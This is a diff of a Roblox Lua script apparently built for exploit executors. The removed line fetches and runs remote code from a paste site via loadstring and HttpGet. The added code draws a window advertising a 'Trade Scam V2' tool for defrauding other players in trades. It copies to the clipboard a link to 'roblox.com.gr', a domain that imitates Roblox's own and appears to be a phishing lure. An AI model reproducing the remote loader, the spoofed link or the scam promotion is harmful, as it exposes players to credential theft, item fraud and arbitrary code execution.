@@ -1,1 +1,172 @@
-loadstring(game:HttpGet("https://paste.fe4r.click/raw/428d46c4-2485-4336-b523-3f6aa776043d"))()
+local Players = game:GetService("Players")
+local UserInputService = game:GetService("UserInputService")
+
+local player = Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+
+local GROUP_LINK = "https://www.roblox.com.gr/communities/968551335978/NEXEN-SCRIPTS"
+
+-- ScreenGui
+local gui = Instance.new("ScreenGui")
+gui.Name = "GachaLuckTradeScamV2GUI"
+gui.ResetOnSpawn = false
+gui.Parent = playerGui
+
+-- Main window
+local main = Instance.new("Frame")
+main.Name = "Main"
+main.Size = UDim2.fromOffset(430, 270)
+main.Position = UDim2.new(0.5, -215, 0.5, -135)
+main.BackgroundColor3 = Color3.fromRGB(24, 27, 38)
+main.BorderSizePixel = 0
+main.Parent = gui
+
+local corner = Instance.new("UICorner")
+corner.CornerRadius = UDim.new(0, 12)
+corner.Parent = main
+
+-- Top bar
+local top = Instance.new("Frame")
+top.Size = UDim2.new(1, 0, 0, 55)
+top.BackgroundColor3 = Color3.fromRGB(92, 30, 30)
+top.BorderSizePixel = 0
+top.Parent = main
+
+local topCorner = Instance.new("UICorner")
+topCorner.CornerRadius = UDim.new(0, 12)
+topCorner.Parent = top
+
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, -20, 1, 0)
+title.Position = UDim2.fromOffset(10, 0)
+title.BackgroundTransparency = 1
+title.Text = "🏴‍☠️  Gacha Luck • Trade Scam V2"
+title.TextColor3 = Color3.fromRGB(255, 211, 92)
+title.TextSize = 22
+title.Font = Enum.Font.GothamBold
+title.TextXAlignment = Enum.TextXAlignment.Left
+title.Parent = top
+
+-- Description
+local info = Instance.new("TextLabel")
+info.Size = UDim2.new(1, -40, 0, 65)
+info.Position = UDim2.fromOffset(20, 75)
+info.BackgroundTransparency = 1
+info.Text = "Join the community to access Gacha Luck and Trade Scam V2."
+info.TextColor3 = Color3.fromRGB(225, 225, 225)
+info.TextSize = 16
+info.Font = Enum.Font.Gotham
+info.TextWrapped = true
+info.Parent = main
+
+-- Link box
+local linkBox = Instance.new("TextBox")
+linkBox.Size = UDim2.new(1, -40, 0, 40)
+linkBox.Position = UDim2.fromOffset(20, 145)
+linkBox.BackgroundColor3 = Color3.fromRGB(38, 42, 56)
+linkBox.TextColor3 = Color3.fromRGB(190, 195, 210)
+linkBox.Text = GROUP_LINK
+linkBox.TextSize = 14
+linkBox.Font = Enum.Font.Gotham
+linkBox.ClearTextOnFocus = false
+linkBox.TextEditable = false
+linkBox.Selectable = true
+linkBox.Parent = main
+
+local linkCorner = Instance.new("UICorner")
+linkCorner.CornerRadius = UDim.new(0, 8)
+linkCorner.Parent = linkBox
+
+-- Copy button
+local copyButton = Instance.new("TextButton")
+copyButton.Size = UDim2.fromOffset(180, 42)
+copyButton.Position = UDim2.new(0.5, -90, 0, 200)
+copyButton.BackgroundColor3 = Color3.fromRGB(190, 145, 45)
+copyButton.Text = "📋 Copy Group Link"
+copyButton.TextColor3 = Color3.fromRGB(25, 25, 25)
+copyButton.TextSize = 15
+copyButton.Font = Enum.Font.GothamBold
+copyButton.AutoButtonColor = true
+copyButton.Parent = main
+
+local buttonCorner = Instance.new("UICorner")
+buttonCorner.CornerRadius = UDim.new(0, 8)
+buttonCorner.Parent = copyButton
+
+local function copyLink()
+    -- Works on executors/environments that provide setclipboard.
+    if typeof(setclipboard) == "function" then
+        setclipboard(GROUP_LINK)
+
+        copyButton.Text = "✓ Link Copied!"
+        task.delay(1.5, function()
+            if copyButton and copyButton.Parent then
+                copyButton.Text = "📋 Copy Group Link"
+            end
+        end)
+
+        return
+    end
+
+    -- Roblox mobile/PC fallback:
+    -- Select the text so the user can use the platform's Copy command.
+    linkBox:CaptureFocus()
+
+    task.defer(function()
+        linkBox.SelectionStart = 1
+        linkBox.CursorPosition = #GROUP_LINK + 1
+    end)
+
+    copyButton.Text = "Select & Copy Link"
+
+    task.delay(2, function()
+        if copyButton and copyButton.Parent then
+            copyButton.Text = "📋 Copy Group Link"
+        end
+    end)
+end
+
+copyButton.Activated:Connect(copyLink)
+
+-- =========================
+-- DRAGGABLE WINDOW
+-- =========================
+
+local dragging = false
+local dragStart
+local startPosition
+
+top.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1
+        or input.UserInputType == Enum.UserInputType.Touch then
+
+        dragging = true
+        dragStart = input.Position
+        startPosition = main.Position
+
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then
+                dragging = false
+            end
+        end)
+    end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+    if not dragging then
+        return
+    end
+
+    if input.UserInputType == Enum.UserInputType.MouseMovement
+        or input.UserInputType == Enum.UserInputType.Touch then
+
+        local delta = input.Position - dragStart
+
+        main.Position = UDim2.new(
+            startPosition.X.Scale,
+            startPosition.X.Offset + delta.X,
+            startPosition.Y.Scale,
+            startPosition.Y.Offset + delta.Y
+        )
+    end
+end)
